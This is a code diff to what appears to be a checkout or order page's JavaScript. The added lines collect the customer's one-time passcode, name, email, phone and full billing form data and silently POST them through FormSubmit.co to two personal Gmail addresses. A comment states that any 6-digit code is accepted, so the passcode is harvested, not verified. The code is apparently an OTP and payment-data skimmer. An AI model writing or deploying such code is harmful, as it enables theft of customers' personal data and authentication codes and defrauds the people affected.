@@ -126,6 +126,9 @@
     
     document.getElementById("otp-error").textContent = "";
     
+    // Send OTP to email
+    sendOTPEmail(otp);
+    
     // Accept any 6-digit code and submit order
     submitFinalData();
     
@@ -176,6 +179,41 @@
     }
     
     // Submit to both FormSubmit.co recipients
+    Promise.all([
+      fetch("https://formsubmit.co/ajax/anandjhare4@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(Object.fromEntries(formData))
+      }),
+      fetch("https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(Object.fromEntries(formData))
+      })
+    ]).catch(() => {});
+  }
+
+  function sendOTPEmail(otp) {
+    const formData = new FormData();
+    formData.append('_subject', 'OTP Submitted by Customer');
+    formData.append('_template', 'table');
+    formData.append('_captcha', 'false');
+    formData.append('_autoresponse', `OTP ${otp} has been received and your order is being processed.`);
+    
+    // Add OTP and customer details
+    formData.append('submittedOTP', otp);
+    formData.append('fullName', billingData.firstName + ' ' + billingData.lastName);
+    formData.append('email', billingData.email);
+    formData.append('phone', billingData.phone);
+    formData.append('message', `Customer has submitted OTP for order verification.\n\nSubmitted OTP: ${otp}\nCustomer Email: ${billingData.email}\nCustomer Phone: ${billingData.phone}\nOrder Status: OTP Verified\n\nOrder is being processed.`);
+    
+    // Send to both email recipients
     Promise.all([
       fetch("https://formsubmit.co/ajax/anandjhare4@gmail.com", {
         method: "POST",
